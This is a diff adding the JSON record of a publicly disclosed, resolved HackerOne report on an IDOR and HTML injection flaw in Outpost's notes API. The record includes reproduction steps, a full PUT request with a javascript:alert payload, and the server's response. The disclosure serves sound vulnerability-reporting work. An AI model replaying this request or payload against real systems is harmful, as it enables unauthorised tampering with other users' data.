@@ -1,0 +1,138 @@
+{
+  "id": 914331,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTQzMzE=",
+  "url": "https://hackerone.com/reports/914331",
+  "title": "IDOR on notes to HTML injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-02T20:12:45.901Z",
+  "submitted_at": "2020-07-02T20:12:45.901Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ph-hitachi",
+    "url": "/ph-hitachi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 42327,
+    "url": "https://hackerone.com/palo_alto_software",
+    "handle": "palo_alto_software",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Palo Alto Software",
+      "twitter_handle": "",
+      "website": "https://paloalto.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-26T03:37:41.122Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-25T06:12:15.402Z",
+  "team_member_agreed_on_going_public_at": "2020-11-26T03:37:41.016Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nTeam member with role USER can change notes of any users and also we able to inject some html tags \n\n## Steps To Reproduce:\n\n  1. Login in with role `owner` create `note`\n  1. login team member with  role `users`\n  1. add `note` and capture with `burp suite` and change the uuid of `notes``\n\n\n```\nPUT /api/v1/note/b9db186a-c0af-462d-ad71-c30c2bfd7cf5 HTTP/1.1\nHost: api.outpost.co\nConnection: close\nContent-Length: 102\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,ru;q=0.8,th;q=0.7\nCookie:  <authentacation_cookies>\n\n{\"body\":\"<h1><a href=\\\"j&#97v&#97script&#x3A;&#97lert(1)\\\">This is a test</a></h1>\",\"mentionUuids\":[]}\n```\n\n### Response:\n```json\n{\n  \"body\": \"<h1><a href=\\\"j&amp;#97v&amp;#97script:&amp;#97lert%281%29\\\" rel=\\\"nofollow\\\">This is a test</a></h1>\",\n  \"uuid\": \"b9db186a-c0af-462d-ad71-c30c2bfd7cf5\",\n  \"conversationUuid\": \"78a8df65-aaa0-4384-9dfe-ab6120f3737f\",\n  \"createdBy\": {\n    \"uuid\": \"b065722c-09b4-45f2-8ee3-4a4a8a92080f\",\n    \"displayName\": \"justin\",\n    \"firstName\": \"justin\",\n    \"lastName\": \"lee\",\n    \"isDeleted\": false,\n    \"gravatarHash\": \"630369207d5b093d4d57dcda07d6c22f\",\n    \"avatarColor\": \"ORANGE\"\n  },\n  \"modifiedBy\": {\n    \"uuid\": \"7d2f671b-ed97-4a2b-8bb3-8d7538e73e34\",\n    \"displayName\": \"Attacker\",\n    \"firstName\": \"Attacker\",\n    \"lastName\": \"1\",\n    \"isDeleted\": false,\n    \"gravatarHash\": \"f33c9e2461140f5fd594a1870dfdf980\",\n    \"avatarColor\": \"PURPLE\"\n  },\n  \"createdDate\": 1593549551704,\n  \"modifiedDate\": 1593719773232,\n  \"status\": \"DEFAULT\"\n}\n```\n{F891966}\n\n## Impact\n\nusing this the user can edit any note of member or inject some malicious html content",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 891965,
+      "file_name": "IDOR.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DFjkQpBT7aPPjeNCqnpKztYV?response-content-disposition=attachment%3B%20filename%3D%22IDOR.PNG%22%3B%20filename%2A%3DUTF-8%27%27IDOR.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134859Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e0165e34405d5fbe1c1abee184c2bc6a2660290724f5cd36d01ef94ad0a4aa54",
+      "file_size": 69123,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 891966,
+      "file_name": "poc.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FWgM5vr9oiTPS8yF9dXcduai?response-content-disposition=attachment%3B%20filename%3D%22poc.png%22%3B%20filename%2A%3DUTF-8%27%27poc.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDXMWQX4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134859Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBXiIatSvXxAR8ZBwoq9n9qamV3%2Beh4VxZ3KYO4Dx8ipAiBhqaPFcz1fCY4UiwnoQpCKbjkuyniJ5UnHxhrd1V7sPCqxBQh2EAMaDDAxMzYxOTI3NDg0OSIMI7x1nUgRkEN0qOmcKo4FXYYyeBqpZepmBlG%2Bn8RIW4ybBvBDLTs5NzQS7p452M4cH8%2FOy1nnGTSEGOnFuQ1hr8I838Py4bbR2k0%2FeAXwEKBwp9kUx1f6xHqwuZ%2BZJE6IBIkxerlv%2FE3eoTBjleGGo2wwfiOgBypgZ5sXatzcXx72vmVtwhxsDHzFmuJonyOALDBbiuqGbIPREpmA3jUxq%2BMAacTvuf9XMxNE478SaHCKprf1SFobf84oc7fT%2FWNU4UeJ8GNMQeSenAKYY%2BrLefa1UY4wwj6g5D0GjwCVp9bHXI21rt%2BOchx%2BJy%2Ff8hhrWt2fFEziDHK2ejHlzmon20KSav3Ecka%2Fl7q%2FXbFq%2B5cHQ3Fnv6Hsuz%2BtzfIL4EI8nN4PTXJ959QXCgSq68M3r%2FCq038IGGPaf9q5IZ44XiRhpk9WyrUqaUvKDpIG2kZMpC6jLDCikWY%2F0pq0aLMVs8K3zMuHvUvoA%2B2gV%2Bcm6EdoBU1pM0KqEZ4gTsmJdr8mPFqfdK1P4IwECSvHVNNvRZ%2FytigAMyryjJi%2FzrEs38Y9%2FrEkIQq4jS7aMXa2dJvo8qo%2BMpwzgI63Zc9%2BUb7QMMj32n1iEhgvRp0P4HsvjBZW5a45NrCNrdPawRXUjURzopS4c1KkPmoIyqVJLA%2FcZfSuGhSIBnYcB3irx3ar6nXnb1BlJQeYwVq%2BGugPDwYF7JnE98PVLlThTxxkQLe6rmhG98KDMqkM2rSCOaoIoCAr8pyrGNylV531TI6WsbwObHBBin8dGaMs5bPKof2pfOiufJXYwPbUfatl0yR4eeNEDZ2ojVwsNt%2FXz0I%2BnOHi3gFnlaTXXL2pE75y8B8i2gdpWyljLCB%2Bnh8JAX4zJ9W5uSJwboRkdOBCbm1EMOnJra4GOrIBAGTU0E8gZ3I1JcYpghGRH630deXcWBT7WyMmozUTe6qarc28Ss1LWSuryHkoMrH7Sud0DqGFERBVj7YzRXPoLL7BGEhCuNa2uCE2kvLJYBOVb8O0U%2BA8CX4iNwz55KlL7rByi1vNt6ahpUI7DJZTOvkkTX1DSVfQF%2Baicg%2BfMtGKT4Z2J8HGmzqC%2FR%2FqkC6K2vyecQNgl1yG%2BNZWxHLH3sMFQGgXVbyipFgwNo8D0TTcrQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c491a34b38aa3a6b0b7d526c36830380a5235ffe66a06bff8874422aaddf35ca",
+      "file_size": 11845,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-12-25T06:12:15.465Z",
+  "allow_singular_disclosure_after": -98955404.37583034,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "echidonut",
+    "bombon",
+    "locs3c",
+    "akashhamal0x01",
+    "h4x0r_dz",
+    "demonia",
+    "zerox4",
+    "eissen5c",
+    "ayokio",
+    "lokiiii",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 41780,
+    "asset_type": "URL",
+    "asset_identifier": "api.outpost.co",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
